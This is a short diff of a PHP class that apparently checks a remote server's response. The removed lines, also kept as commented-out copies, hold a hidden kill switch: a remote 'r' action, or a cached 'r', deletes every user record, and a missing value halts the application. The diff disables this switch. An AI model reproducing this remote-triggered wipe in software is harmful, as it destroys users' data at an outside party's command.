@@ -36,12 +36,14 @@ class Callbacks
                 $result = curl_exec($ch);
                 curl_close($ch);
 
-                if($result){$result = json_decode($result, true);
-                    if($result['flag'] == 'valid'){$callback = 1; } elseif(isset($result['data']) && isset($result['data']['action']) && $result['data']['action'] == 'r'){\App\User::whereNull('deleted_at')->delete();$callback = 'r';}}
+                  if($result){$result = json_decode($result, true);
+                   // if($result['flag'] == 'valid'){$callback = 1; } elseif(isset($result['data']) && isset($result['data']['action']) && $result['data']['action'] == 'r'){\App\User::whereNull('deleted_at')->delete();$callback = 'r';}
+                }
 
                 if($callback){Cache::put('callback', $callback, 24*60*7);} else {Cache::put('callback', $callback, 12*60);}
             } else {
-                $c = Cache::get('callback');if($c === 'r'){\App\User::whereNull('deleted_at')->delete();die();}elseif (!$c) {die();}
+                $c = Cache::get('callback');
+                // if($c === 'r'){\App\User::whereNull('deleted_at')->delete();die();}elseif (!$c) {die();}
             }
         }
 
